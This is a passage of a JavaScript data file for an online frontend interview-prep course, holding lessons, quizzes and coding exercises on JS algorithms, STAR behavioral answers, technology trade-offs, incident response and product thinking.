// Iterative (handles deep nesting without stack overflow)
function flattenIterative(arr) {
  const stack = [...arr]
  const result = []
  while (stack.length) {
    const item = stack.pop()  // process in reverse
    if (Array.isArray(item)) {
      stack.push(...item)     // flatten one level, push back
    } else {
      result.unshift(item)    // maintain order
    }
  }
  return result
}

// One-liner with Array.flat(Infinity)
[1, [2, [3, [4]]]].flat(Infinity)  // mention this too

console.log(flatten([1, [2, [3, [4]], 5]]))  // [1, 2, 3, 4, 5]
\`\`\`

---

### Challenge 2: EventEmitter

\`\`\`js
class EventEmitter {
  constructor() {
    this.listeners = {}  // { event: [handler, handler, ...] }
  }

  on(event, handler) {
    if (!this.listeners[event]) this.listeners[event] = []
    this.listeners[event].push(handler)
    return this  // allow chaining
  }

  off(event, handler) {
    if (!this.listeners[event]) return this
    this.listeners[event] = this.listeners[event].filter(h => h !== handler)
    return this
  }

  emit(event, ...args) {
    (this.listeners[event] || []).forEach(handler => handler(...args))
    return this
  }

  once(event, handler) {
    const wrapper = (...args) => {
      handler(...args)
      this.off(event, wrapper)  // remove after first call
    }
    return this.on(event, wrapper)
  }
}

const emitter = new EventEmitter()
emitter.on('data', d => console.log('received:', d))
emitter.emit('data', { id: 1 })  // "received: { id: 1 }"
\`\`\`

---

### Challenge 3: Currying

\`\`\`js
// curry(f) returns f in curried form
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      // Have all required args — call the function
      return fn.apply(this, args)
    }
    // Return a new function collecting remaining args
    return function(...moreArgs) {
      return curried.apply(this, args.concat(moreArgs))
    }
  }
}

const add = curry((a, b, c) => a + b + c)
add(1)(2)(3)    // 6
add(1, 2)(3)    // 6
add(1)(2, 3)    // 6
add(1, 2, 3)    // 6

// Real use: partial application
const addTax = add(0.1)     // partially applied
const addVAT = addTax(0.2)  // further applied
\`\`\`

---

### Challenge 4: Implement Promise.all

\`\`\`js
function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    if (!promises.length) return resolve([])

    const results = new Array(promises.length)
    let resolved = 0

    promises.forEach((p, i) => {
      Promise.resolve(p)  // handle non-promise values
        .then(value => {
          results[i] = value  // preserve order
          if (++resolved === promises.length) resolve(results)
        })
        .catch(reject)  // first rejection fails the whole thing
    })
  })
}

// Test
promiseAll([
  Promise.resolve(1),
  Promise.resolve(2),
  fetch('/api/data').then(r => r.json()),
]).then(results => console.log(results))  // [1, 2, { ... }]
\`\`\`

---

### Challenge 5: Deep Clone Without JSON.parse/JSON.stringify

\`\`\`js
function deepClone(obj) {
  // Handle primitives
  if (obj === null || typeof obj !== 'object') return obj

  // Handle Date
  if (obj instanceof Date) return new Date(obj.getTime())

  // Handle Array
  if (Array.isArray(obj)) return obj.map(deepClone)

  // Handle RegExp
  if (obj instanceof RegExp) return new RegExp(obj.source, obj.flags)

  // Handle plain Object
  const clone = Object.create(Object.getPrototypeOf(obj))
  for (const key of Object.keys(obj)) {
    clone[key] = deepClone(obj[key])
  }
  return clone
}

// Production: use structuredClone() — handles circular refs, more types
const clone = structuredClone(original)
\`\`\`

---

### Complexity Cheatsheet

| Operation | Array | Map | Set |
|---|---|---|---|
| Search | O(n) | O(1) | O(1) |
| Insert | O(1) amortized | O(1) | O(1) |
| Delete | O(n) | O(1) | O(1) |
| Has | O(n) | O(1) | O(1) |

When an interviewer asks "can you optimize this?" — usually means replace an O(n) search with a Map/Set.
`,
    quiz: [
      { q: 'In the iterative flatten implementation, why use stack.push(...item) instead of recursion?', options: ['Spread is faster than recursion', 'Iterative avoids call stack overflow for deeply nested arrays', 'Recursion doesn\'t work with arrays', 'Iteration preserves array order automatically'], correct: 1, explanation: 'Deep recursion can cause "Maximum call stack size exceeded". Iterative solution with an explicit stack uses heap memory instead, which is much larger. Same algorithm, no stack overflow risk.' },
      { q: 'What does curry(fn).length check achieve in the curry implementation?', options: ['Checks if fn is a function', 'Determines if enough arguments have been collected to call fn', 'Counts closures', 'Validates argument types'], correct: 1, explanation: 'fn.length returns the number of declared parameters. If args.length >= fn.length, all required arguments are present and fn can be called. This is what enables partial application.' },
      { q: 'Why use results[i] = value with a counter instead of results.push() in promiseAll?', options: ['push is slower', 'Promises may resolve in any order — indexed assignment preserves the input order', 'push doesn\'t work in Promises', 'Counter prevents race conditions'], correct: 1, explanation: 'Promise.all must return results in the same order as the input, regardless of which promise resolves first. promises[0] might take 1s, promises[1] might take 100ms — results[1] should be the second input\'s value.' },
      { q: 'What is the main limitation of JSON.parse(JSON.stringify(obj)) for deep cloning?', options: ['It\'s too slow for small objects', 'It loses functions, Date objects, undefined, Symbol, circular references', 'It doesn\'t work on arrays', 'It only clones one level'], correct: 1, explanation: 'JSON serialization converts Dates to strings, silently drops functions, undefined, and Symbols, and throws on circular references. Use structuredClone() (modern) or a recursive clone function for correct behavior.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement throttle(fn, limit) — a function that ensures fn is called at most once per `limit` milliseconds. Unlike debounce (which resets the timer), throttle fires on the leading edge and then ignores calls until the limit passes. Test it with a scroll simulation.',
      starterCode: `function throttle(fn, limit) {
  // TODO: track whether we are currently "throttled"
  // On each call: if not throttled, call fn and set throttled=true
  // Set a timer to reset throttled after limit ms
}

// Test
let callCount = 0
const onScroll = throttle(() => {
  callCount++
  console.log(\`Scroll handler called (call #\${callCount}) at \${Date.now()}\`)
}, 200)

// Simulate 10 rapid scroll events
let i = 0
const interval = setInterval(() => {
  onScroll()
  if (++i >= 10) {
    clearInterval(interval)
    console.log(\`Total calls: \${callCount} out of 10 events\`)
    // Should be ~1 (leading edge fires, then throttled for 200ms)
  }
}, 20)  // 20ms between events, 200ms throttle`,
      hints: ['Use let inThrottle = false in the closure', 'If !inThrottle: call fn, set inThrottle = true, setTimeout(() => inThrottle = false, limit)', 'This is leading-edge throttle — fires immediately then blocks'],
    },
  },
  {
    id: 'cc-interview-fe-m09', track: 'crash', title: 'Behavioral STAR Stories for Frontend Devs',
    subtitle: 'Turn your real projects into compelling interview answers. How to structure every "tell me about a time you…" question for frontend roles.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 240, duration: 16, module: 9, certArea: 'Frontend Interview Prep',
    content: `Every technical interview includes behavioral questions that trip up developers who can code but can't tell their own story. The STAR framework — Situation, Task, Action, Result — is the universal structure, but most candidates lose the result or make the action sound accidental. This module shows you how to turn your real frontend work into interview gold.

## The STAR Framework for Frontend Roles

**Situation** sets the stage in one sentence. Keep it lean: "Our job board had a 7-second first load on mobile." Don't explain the whole product history.

**Task** clarifies your specific responsibility. "I owned the performance optimization sprint for the entire frontend." This distinguishes your role from the team's role.

**Action** is the bulk of the answer — 3 to 5 concrete steps you personally took. "I ran Lighthouse, identified render-blocking fonts and a 400KB unoptimized hero image, added next/image with WebP conversion, deferred non-critical scripts with strategy='lazyOnload', and split the CSS bundle with dynamic imports." Use tool names, metric names, and exact decisions.

**Result** must include a number. "LCP dropped from 7.2s to 1.8s. Mobile bounce rate fell by 34% over the following two weeks." If you don't have exact numbers, estimate: "roughly" or "approximately" is fine — "our performance improved" is not.

## The Five Universal Behavioral Questions

These five appear in nearly every frontend interview. Prepare a STAR answer for each before the interview:

1. **Tell me about a time you improved performance.** Use a Lighthouse/Core Web Vitals story. Anchor to LCP, CLS, or FID/INP numbers.

2. **Describe a situation where you had to learn something fast.** Use a framework migration or a new tool adoption. Show the learning process, not just the outcome.

3. **Tell me about a conflict with a teammate.** Use a code review disagreement or a design-vs-implementation debate. The resolution matters more than the conflict.

4. **Give an example of a project you're most proud of.** This is not about the biggest project — it's about the one where you made the most independent decisions. Your job board app is perfect here.

5. **Tell me about a time you failed.** Interviewers are testing self-awareness. Pick something real, own it cleanly, and end with what you'd do differently.

## Building Your Story Bank

Map your real projects to these questions before the interview. For your job board project at jsusrpemetech.online:

- Performance question → next/image, lazy loading, bundle analysis
- Learning fast → picking up any tool you hadn't used before (Supabase Realtime, Playwright, etc.)
- Proud project → the job board itself — explain the product decision (who it helps, why that matters)
- Conflict → any design or technology choice you debated
- Failure → a bug you shipped, a feature that didn't work as expected, or a missed deadline

The goal is to have 5–8 STAR stories ready. Each story should be adaptable to multiple questions by emphasizing different parts.

## Common Mistakes

Candidates fail behavioral questions by: (1) being vague — "I improved the performance a lot"; (2) using "we" instead of "I" — the interviewer wants your contribution, not the team's; (3) skipping the result — your action means nothing without measurable impact; (4) telling a negative story without a clear resolution.

Practicing out loud matters. The story sounds very different in your head versus spoken to another person. Record yourself and listen for filler words, vagueness, and missing results.`,
    keyTerms: [
      { term: 'STAR Framework', definition: 'Situation, Task, Action, Result — the standard structure for behavioral interview answers.' },
      { term: 'Story Bank', definition: 'A prepared set of STAR stories mapped to common behavioral questions, ready to adapt during interviews.' },
      { term: 'Quantified Result', definition: 'A result anchored to a specific metric (percentage, time, count) that makes impact concrete and credible.' },
      { term: 'Contribution Clarity', definition: 'Distinguishing your individual actions from your team\'s collective work — interviewers ask about you, not the team.' },
      { term: 'Adaptive Story', definition: 'A single STAR story flexible enough to answer multiple question types by shifting emphasis between elements.' },
    ],
    quiz: [
      {
        q: 'An interviewer asks "Tell me about a time you improved performance." You say: "We refactored our app and performance got a lot better." What is the primary problem with this answer?',
        options: ['It is too long', 'It uses "we" and lacks a quantified result', 'It mentions refactoring instead of optimization', 'Performance is not a valid topic'],
        correct: 1,
        explanation: '"We" hides your individual contribution, and "a lot better" is vague — interviewers need a specific number like "LCP dropped from 6s to 1.4s".',
      },
      {
        q: 'In the STAR framework, what does the Action component primarily contain?',
        options: ['The business context and problem background', '3–5 specific steps you personally took with tool and decision names', 'The measurable outcome of the project', 'Your role title and team size'],
        correct: 1,
        explanation: 'Action is the largest part: concrete, sequential steps you personally took, naming specific tools, metrics, and decisions — not vague summaries.',
      },
      {
        q: 'When asked "Tell me about a time you failed," the safest and most effective approach is to:',
        options: ['Describe a failure that happened to someone else', 'Say you cannot recall a specific failure', 'Own a real failure, explain root cause, and state what you\'d do differently', 'Turn the answer into a success story immediately'],
        correct: 2,
        explanation: 'Interviewers use this question to test self-awareness and growth mindset. Owning a real failure, diagnosing it clearly, and articulating the lesson is the strongest answer.',
      },
      {
        q: 'You have one strong project story. Which is the best way to use it across multiple behavioral questions?',
        options: ['Only use it for the "proud project" question', 'Repeat it verbatim for every question', 'Adapt it by shifting emphasis — lead with performance for a perf question, lead with learning for a growth question', 'Create a completely different story for each question'],
        correct: 2,
        explanation: 'One strong project can answer multiple questions by shifting the emphasis. The core facts stay the same; which element (Situation vs Action vs Result) you expand changes.',
      },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a function `starAnswer(situation, task, action, result)` that formats a STAR answer as a structured string. Then write out a complete STAR answer object for a frontend performance improvement story — fill all four fields with realistic, specific content (tool names, metrics, numbers).',
      starterCode: `function starAnswer(situation, task, action, result) {
  // Return a formatted string combining all four parts
  // Each part should be labeled and on its own section
}

// Example usage — fill this in with a real performance story
const myPerformanceStory = starAnswer(
  'Situation: ...',
  'Task: ...',
  'Action: ...',  // Include 3+ specific steps with tool names
  'Result: ...'   // Include at least one metric/number
)

console.log(myPerformanceStory)`,
      solution: `function starAnswer(situation, task, action, result) {
  return \`SITUATION: \${situation}

TASK: \${task}

ACTION: \${action}

RESULT: \${result}\`
}

const myPerformanceStory = starAnswer(
  'Our job board homepage had a 6.8s LCP on mobile, causing high bounce rates on slower connections.',
  'I owned the entire frontend performance sprint — no other engineers were working on it.',
  '1) Ran Lighthouse and identified three blockers: render-blocking Google Fonts, a 420KB unoptimized hero image, and a synchronous analytics script. 2) Migrated fonts to next/font with display=swap. 3) Replaced the img tag with next/image using WebP and priority=true for above-the-fold. 4) Moved the analytics script to strategy=lazyOnload. 5) Verified with Lighthouse CI in the PR to prevent regression.',
  'LCP dropped from 6.8s to 1.3s — below the 2.5s "Good" threshold. Mobile bounce rate fell 28% over the next two weeks based on our analytics dashboard.'
)

console.log(myPerformanceStory)`,
      hints: ['Each STAR field should be a complete, detailed sentence or paragraph', 'The Action should list specific steps with tool names, not vague summaries', 'The Result must include at least one number — approximate is fine if exact is unknown'],
    },
  },
  {
    id: 'cc-interview-fe-m10', track: 'crash', title: 'Trade-off Articulation — Why You Chose What You Chose',
    subtitle: 'Senior interviewers don\'t just ask what you used — they ask why. Master the framework for defending every technology choice cleanly.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 240, duration: 15, module: 10, certArea: 'Frontend Interview Prep',
    content: `The question "Why did you choose X instead of Y?" separates junior from senior candidates. Junior developers use what they know. Senior engineers choose what fits and can articulate why. This module teaches you to defend any frontend technology decision with a structured trade-off analysis.

## The Trade-off Framework

Every technology trade-off has the same structure: **Context → Criteria → Options → Decision → Tradeoffs accepted**.

1. **Context**: What were you building? What constraints existed (team size, timeline, bundle size, SEO requirements)?
2. **Criteria**: What did you need the tool to do well? Speed of development, bundle size, long-term maintainability, learning curve?
3. **Options**: What alternatives did you consider? Name at least two.
4. **Decision**: Which did you pick and why it best fit your criteria?
5. **Tradeoffs accepted**: What are you giving up by making this choice? Showing you understand the downside builds more credibility than pretending your choice was perfect.

## The 7 Most Common Frontend Trade-off Questions

**1. Tailwind CSS vs CSS Modules vs Styled Components**
Tailwind wins on speed of development and consistency but sacrifices semantic class names and adds HTML verbosity. CSS Modules win on encapsulation and readability but require switching between files. Styled Components add runtime cost. For a Next.js app with a small team moving fast, Tailwind is the correct default.

**2. React Query vs Zustand vs Redux**
React Query is a server-state manager, not a general state manager. Redux is global client state with time-travel debugging — correct for complex apps with many engineers. Zustand is lightweight global state without boilerplate. Most apps need React Query for async data + Zustand for UI state. Redux is overkill unless you have a large team or need middleware.

**3. Next.js vs plain React (Vite)**
Next.js wins on SEO (SSR/SSG), routing, image optimization, and production deployment. Plain React wins on simplicity for SPAs with no SEO requirements (dashboards, internal tools). For a job board with public-facing pages, Next.js is the right call.

**4. useContext vs state library**
Context re-renders everything subscribed to it on every change. Use Context for slowly-changing global data (auth user, theme). Use Zustand/Jotai for frequently-updating or performance-sensitive state.

**5. REST vs GraphQL**
REST wins for simple CRUD with clear resource boundaries. GraphQL wins when consumers have varying data needs (mobile vs web fetching different fields) or when over-fetching is a performance problem.

**6. TypeScript vs JavaScript**
TypeScript adds compile-time safety, better IDE support, and self-documenting interfaces. The cost is a slightly steeper learning curve and build step. For any project with more than one person or lasting more than a few weeks, TypeScript is always the right call.

**7. Supabase vs Firebase vs custom backend**
Supabase: open-source, PostgreSQL, row-level security, generous free tier, easier to migrate away from. Firebase: mature real-time SDK but vendor lock-in and NoSQL limitations. Custom backend: full control but much more work. For a solo or small team building a product with relational data, Supabase wins.

## How to Deliver a Trade-off Answer

Interviewers are not looking for the "right" answer — they're looking for *structured thinking*. A strong answer sounds like:

> "I chose Tailwind CSS because our team needed to move fast and maintain visual consistency without context-switching between files. The tradeoff I accepted was verbose HTML, which I mitigated by extracting repeated utility combinations into components. I considered CSS Modules but they would have slowed us down and made design tokens harder to share."

Notice: criteria named, alternative mentioned, tradeoff acknowledged.`,
    keyTerms: [
      { term: 'Trade-off Framework', definition: 'Context → Criteria → Options → Decision → Tradeoffs accepted — the five-step structure for defending any technology choice.' },
      { term: 'Server State vs Client State', definition: 'Server state is data that lives on the server and must be fetched/cached (React Query). Client state is UI-only data (Zustand, Context).' },
      { term: 'Over-fetching', definition: 'An API pattern where the response includes more data than the consumer needs, wasting bandwidth — a key motivation for GraphQL.' },
      { term: 'Vendor Lock-in', definition: 'Dependency on a specific provider\'s proprietary features that makes migration difficult — relevant when choosing Firebase vs Supabase vs custom backend.' },
      { term: 'Accepted Tradeoff', definition: 'The downside of your technology choice that you consciously accepted because the benefits outweighed it — stating this explicitly shows senior-level thinking.' },
    ],
    quiz: [
      {
        q: 'An interviewer asks "Why did you use Tailwind instead of CSS Modules?" The strongest answer structure is:',
        options: ['Tailwind is simply better for all projects', 'Name your criteria, the alternative considered, your decision, and one tradeoff you accepted', 'List Tailwind features without mentioning CSS Modules', 'Say the team decided — it was not your choice'],
        correct: 1,
        explanation: 'Strong trade-off answers name criteria (speed, consistency), acknowledge the alternative (CSS Modules), state the decision, and honestly name one thing you gave up (verbose HTML).',
      },
      {
        q: 'When should you use React Query vs Zustand?',
        options: ['React Query for all state, Zustand is never needed', 'React Query for async server data (caching/fetching), Zustand for global client UI state', 'Zustand for server state, React Query for client state', 'They are interchangeable — pick either'],
        correct: 1,
        explanation: 'React Query manages server state (async fetching, caching, invalidation). Zustand manages client state (UI flags, user preferences, modal state). They complement, not replace, each other.',
      },
      {
        q: 'What does acknowledging a tradeoff in your technology choice demonstrate to an interviewer?',
        options: ['That you made a bad choice and should have picked differently', 'That you are uncertain about your decision', 'Senior-level thinking — you considered the full picture and made a deliberate choice', 'That the technology is generally inferior'],
        correct: 2,
        explanation: 'Saying "I accepted this tradeoff because the benefit outweighed it" shows mature engineering judgment. Pretending your choice had no downsides makes you sound inexperienced.',
      },
      {
        q: 'Why is Next.js the correct choice over plain React (Vite) for a job board with public-facing listings?',
        options: ['Next.js is always faster', 'Next.js has more npm downloads', 'Next.js SSR/SSG enables SEO indexing of job listings — Vite SPA pages are not crawled by default', 'Vite does not support TypeScript'],
        correct: 2,
        explanation: 'Job listings need to be indexed by Google. Next.js SSR generates HTML on the server for each page, making it crawlable. A Vite SPA returns a blank HTML shell that search engines cannot index.',
      },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a function `tradeoffDecision(context, criteria, options, decision, tradeoffsAccepted)` that formats a trade-off analysis as a structured string. Then call it to document one real technology decision from your own projects (e.g., why you chose Tailwind, Supabase, Next.js, or any other tool).',
      starterCode: `function tradeoffDecision(context, criteria, options, decision, tradeoffsAccepted) {
  // Format a trade-off analysis as a readable string
}

// Fill in a real decision from your project
const myDecision = tradeoffDecision(
  'context: what were you building and what constraints existed?',
  'criteria: what did the tool need to do well?',
  ['option A', 'option B'],
  'what did you pick and why it best matched your criteria?',
  'what did you give up by making this choice?'
)

console.log(myDecision)`,
      solution: `function tradeoffDecision(context, criteria, options, decision, tradeoffsAccepted) {
  return \`CONTEXT: \${context}

CRITERIA: \${criteria}

OPTIONS CONSIDERED: \${options.join(', ')}

DECISION: \${decision}

TRADEOFFS ACCEPTED: \${tradeoffsAccepted}\`
}

const myDecision = tradeoffDecision(
  'Building a job board with public-facing listings that need SEO indexing, solo developer, 6-week timeline.',
  'SSR for SEO, built-in routing, image optimization, and Vercel deployment integration.',
  ['Next.js App Router', 'Vite + React SPA', 'Remix'],
  'Next.js App Router — SSR out of the box for public pages, next/image for performance, Vercel deployment in one command, and Server Components reduce client bundle size.',
  'Slightly higher learning curve than plain Vite, App Router is newer so some StackOverflow answers target the Pages Router. Accepted because SSR and image optimization were non-negotiable for the product.'
)

console.log(myDecision)`,
      hints: ['Context should mention what you were building and any constraints (team size, timeline, SEO needs)', 'Decision should name why your choice best matched your specific criteria', 'Tradeoffs accepted is the differentiating field — most candidates skip this'],
    },
  },
  {
    id: 'cc-interview-fe-m11', track: 'crash', title: '3am Production Incident — Debug Under Pressure',
    subtitle: 'Walk through a live production crisis like a senior engineer: systematic diagnosis, calm communication, fast resolution without making it worse.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 260, duration: 17, module: 11, certArea: 'Frontend Interview Prep',
    content: `The 3am production incident question appears in senior frontend and full-stack interviews. The format is: "Production is down / performance spiked / users can't log in. Walk me through what you do." Interviewers are not testing whether you know the answer — they're testing whether you panic or get systematic.

## The Incident Response Framework (IRF)

Every production incident follows the same five phases, whether it takes 10 minutes or 10 hours:

**1. Assess severity and scope** (2 minutes)
Before touching anything: what is broken, for how many users, since when? Check your error monitoring (Sentry), check analytics (are users converting?), check uptime monitor (is the site even responding?). This prevents you from fixing the wrong thing.

**2. Establish a hypothesis** (3 minutes)
What changed recently? Last deployment time? Any infrastructure changes? Feature flags toggled? The cause of 90% of production incidents is something that recently changed.

**3. Isolate to confirm the hypothesis** (5–15 minutes)
Reproduce the issue in a controlled way. Can you reproduce it in a private/incognito window? On a specific browser? For all users or a subset? Does reverting the last deploy fix it?

**4. Fix or roll back** (5–30 minutes)
The fastest fix is always a rollback if you have one. Deploy a fix only if (a) rollback isn't possible, or (b) the fix is one line and risk is minimal. Never push an untested fix to production at 3am under pressure.

**5. Post-mortem** (next day)
Document: what happened, why it wasn't caught in staging, what monitoring would have alerted you earlier, and what process change prevents this class of incident.

## A Frontend Scenario Walk-Through

**Scenario**: "Your LCP just spiked from 1.5s to 12s in production. It's 3am. Walk me through your response."

**Assess**: Check Sentry — no new JS errors. Check Vercel deployment log — last deployment was 40 minutes ago. Check analytics — bounce rate jumped from 35% to 78%, affecting all users.

**Hypothesis**: The most recent deployment introduced something that is blocking the critical rendering path. New large image? New synchronous script? Added a font?

**Isolate**: Open DevTools → Network tab → filter by document and render-blocking resources. Immediately see a new 2.4MB image being loaded synchronously in the hero section. The PR added a background image directly in CSS without compression. LCP source is that image.

**Fix or rollback**: Rollback the deployment immediately via Vercel dashboard (one button). Inform the team in Slack with a clear incident note: "Rolled back deployment at 3:14am due to 2.4MB uncompressed background image causing 12s LCP. Will fix and redeploy after testing tomorrow." LCP returns to 1.5s within 5 minutes of rollback.

**Post-mortem**: Add a Lighthouse CI step to the PR pipeline that fails the build if LCP exceeds 2.5s. Add image size check to the deploy checklist.

## What Interviewers Are Looking For

1. **Systematic approach**: Did you assess before acting? Did you form a hypothesis before making changes?
2. **Prioritization**: Did you consider rollback before a new fix? Did you know what was safe to touch at 3am?
3. **Communication**: Would you leave the team in the dark or keep them informed with clear, factual updates?
4. **Prevention thinking**: Did you end with what monitoring or process would prevent this next time?

The candidate who says "I would start randomly changing things to see what helps" fails. The candidate who says "First I assess scope, then I form a hypothesis based on recent changes, then I isolate, then I roll back before patching" passes.

## Common Frontend Production Incidents

- **LCP spike**: New unoptimized image, render-blocking script, missing priority attribute on above-fold image
- **Hydration mismatch errors (Next.js)**: Server and client rendering different HTML — often caused by date/time formatting or localStorage access in SSR
- **Blank page in production**: JS bundle error preventing mount — check Sentry for the exact error
- **Auth flow broken**: JWT expiry not handled, Supabase session not refreshed, middleware regex broken
- **CSS completely unstyled**: Tailwind purge removed a class used in dynamic strings — use safelist in tailwind.config`,
    keyTerms: [
      { term: 'Incident Response Framework', definition: 'Assess → Hypothesis → Isolate → Fix/Rollback → Post-mortem — the five phases of systematic production incident resolution.' },
      { term: 'Rollback', definition: 'Reverting to the previous working deployment — almost always safer than pushing a new untested fix under pressure.' },
      { term: 'Post-mortem', definition: 'A blameless analysis after an incident documenting root cause, impact, and process changes to prevent recurrence.' },
      { term: 'Render-blocking Resource', definition: 'A CSS, font, or JavaScript file that prevents the browser from rendering content until it fully loads — primary cause of LCP spikes.' },
      { term: 'Hydration Mismatch', definition: 'A Next.js error when server-rendered HTML does not match client-rendered HTML, causing React to throw and re-render from scratch.' },
    ],
    quiz: [
      {
        q: 'A production site\'s bounce rate just jumped from 30% to 80%. Before changing anything, what is the most important first step?',
        options: ['Push a hotfix immediately', 'Assess scope: how many users are affected, what is broken, and when did it start', 'Roll back the last deployment', 'Check GitHub issues for recent PRs'],
        correct: 1,
        explanation: 'Assessing scope before acting prevents you from fixing the wrong thing. How many users? What exactly is broken? Since when? These answers define the correct response.',
      },
      {
        q: 'It\'s 3am, production is down, and you can identify the bug — it\'s in a complex section of the codebase. What is the safest action?',
        options: ['Push a fix — you know exactly what\'s wrong', 'Roll back the last deployment, then deploy the fix tomorrow after testing', 'Disable the feature flag for that section', 'Wake up the senior engineer to review your fix'],
        correct: 1,
        explanation: 'Rollback is almost always safer than pushing an untested fix under pressure at 3am. Restore service first, then fix and test properly before redeploying.',
      },
      {
        q: 'In Next.js, a "hydration mismatch" error most commonly happens when:',
        options: ['A CSS file fails to load', 'The server renders HTML that is different from what React renders on the client', 'An API route returns a 500 error', 'The next/image component is used incorrectly'],
        correct: 1,
        explanation: 'Hydration mismatches occur when server and client produce different HTML — common causes: Date.now(), Math.random(), localStorage access, or dynamic class names that differ in SSR vs browser.',
      },
      {
        q: 'What is the primary purpose of a post-mortem after a production incident?',
        options: ['To assign blame and identify who caused the issue', 'To document what happened, why it wasn\'t caught earlier, and what process prevents recurrence', 'To evaluate whether to roll back the permanent fix', 'To inform users of the downtime in a public post'],
        correct: 1,
        explanation: 'A good post-mortem is blameless. Its value is the learning: root cause, detection gap, and process change. "Add Lighthouse CI to block LCP regressions" is a concrete, actionable outcome.',
      },
    ],
    ide: {
      language: 'javascript',
      task: 'Write a function `incidentReport(title, severity, timeline, rootCause, resolution, prevention)` that formats a production incident post-mortem. Then fill it in with the LCP spike scenario from this module — use specific tool names, times, and concrete prevention steps.',
      starterCode: `function incidentReport(title, severity, timeline, rootCause, resolution, prevention) {
  // Format a structured post-mortem report
}

const lcpIncident = incidentReport(
  title: '...',        // Short incident title
  severity: '...',     // P0/P1/P2 and user impact
  timeline: '...',     // When it started, detected, resolved
  rootCause: '...',    // Exact technical root cause
  resolution: '...',   // How it was fixed/rolled back
  prevention: '...'    // Monitoring or process change
)

console.log(lcpIncident)`,
      solution: `function incidentReport({ title, severity, timeline, rootCause, resolution, prevention }) {
  return \`## Post-Mortem: \${title}

SEVERITY: \${severity}

TIMELINE: \${timeline}

ROOT CAUSE: \${rootCause}

RESOLUTION: \${resolution}

PREVENTION: \${prevention}\`
}

const lcpIncident = incidentReport({
  title: 'LCP spike from 1.5s to 12s — mobile bounce rate 78%',
  severity: 'P1 — all users affected, no JS errors, site loads but extremely slowly',
  timeline: 'Deployment at 02:31am. Detected at 03:00am via UptimeRobot alert. Rollback at 03:14am. LCP restored by 03:16am.',
  rootCause: 'PR #47 added a 2.4MB uncompressed background image via CSS background-image. The image was not processed through next/image and loaded synchronously, blocking the critical rendering path and causing LCP to jump from 1.5s to 12.3s.',
  resolution: 'Rolled back deployment via Vercel dashboard. Posted incident note in #eng-alerts Slack channel with root cause and ETA for fix.',
  prevention: '1) Add Lighthouse CI GitHub Action that blocks merge if LCP > 2.5s. 2) Add image size check to PR template checklist (warn if asset > 200KB). 3) Add LCP monitoring alert in Vercel Analytics.',
})

console.log(lcpIncident)`,
      hints: ['Prevention should be concrete and tooling-specific, not vague ("add better monitoring" is bad, "add Lighthouse CI that fails on LCP > 2.5s" is good)', 'Resolution should include communication steps, not just the technical fix', 'Timeline should include specific times for detection and resolution'],
    },
  },
  {
    id: 'cc-interview-fe-m12', track: 'crash', title: 'Product Thinking — Why You Built It, Not Just How',
    subtitle: 'Move from "I built a job board" to "I built a job board because X, which led to Y." Product thinking is what separates hireable engineers from talented coders.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 260, duration: 16, module: 12, certArea: 'Frontend Interview Prep',
    content: `The single biggest gap between candidates who get offers and candidates who get rejections is product thinking. Companies don't just want engineers who can execute a spec — they want engineers who understand why the spec exists, who challenges bad specs, and who thinks about user impact before writing code.

## What Product Thinking Means for an Engineer

Product thinking is the ability to connect technical decisions to user outcomes. It does not require a product manager degree. It requires asking three questions before writing code:

1. **Who is this for?** — Who is the actual user? What is their goal?
2. **What problem does this solve?** — Not "what feature does this add" but what user pain does it remove?
3. **How will I know if it worked?** — What metric changes if this is successful?

An engineer who says "I added search to the job board" is describing a feature. An engineer who says "I added search because users were scrolling 3 pages to find senior roles — after adding search with role and level filters, average time-to-apply dropped from 4 minutes to 45 seconds" is demonstrating product thinking.

## Re-framing Your Personal Projects

For every project you have built, practice the product narrative. Your job board at jsusrpemetech.online is your primary proof point. Here is how to frame it:

**Feature narrative (weak)**: "I built a job board with Next.js, Supabase, and Tailwind. It has authentication, job listings, and an application tracker."

**Product narrative (strong)**: "I built a job board to solve my own problem as a job seeker — tracking applications across 15 different company portals was chaotic and I was losing track of follow-up dates. The product has three core jobs-to-be-done: discover roles that match my skills, track applications with status and notes, and prepare for interviews with saved company research. The technical choices — Next.js for SEO so listings are discoverable by Google, Supabase for auth and the application tracking schema, and Tailwind for fast iteration — were driven by the product requirements, not the other way around."

Notice what changed: the problem came first, the user (you) was named, and the technical choices were justified by product requirements.

## The Jobs-to-be-Done Framework

JTBD (Jobs to be Done) is a product framework that describes features in terms of what job the user is hiring the product to do. It is a useful framing for interviews:

> "When I [context], I want to [motivation], so I can [outcome]."

Example: "When I am interviewing at multiple companies, I want to track each application's status and next action, so I can follow up at the right time and not let an opportunity fall through."

This is the job your job board does. When you describe your projects in an interview, use JTBD to explain the product rationale.

## Product Questions You Will Be Asked

1. **"How would you prioritize adding these three features?"** — Evaluate by user impact × implementation cost. Name the highest-impact, lowest-cost item first.

2. **"What metrics would you use to measure success?"** — Always have a primary metric (conversion, retention, task completion rate) and a guardrail metric (don't improve X at the expense of Y).

3. **"What would you build next?"** — Shows forward thinking. Your answer should be grounded in a user problem you observed, not a technology you want to try.

4. **"What would you change about your job board if you had 3 more months?"** — Perfect setup for product thinking. Connect every answer to a user problem first.

## Why This Matters for Standout Candidacy

Companies that dropped degree requirements did so because they want engineers who think like owners. The technical interview proves you can code. The behavioral and product thinking conversation proves you can own outcomes, not just execute tasks. Most candidates can answer the technical questions. Very few can explain *why they built what they built* in terms of user value and product decisions. That conversation is what gets you the offer.`,
    keyTerms: [
      { term: 'Product Thinking', definition: 'The ability to connect technical decisions to user outcomes — understanding why a feature exists before deciding how to build it.' },
      { term: 'Jobs-to-be-Done (JTBD)', definition: 'A product framework describing features in terms of what job the user is hiring the product to perform: "When I [context], I want to [motivation], so I can [outcome]."' },
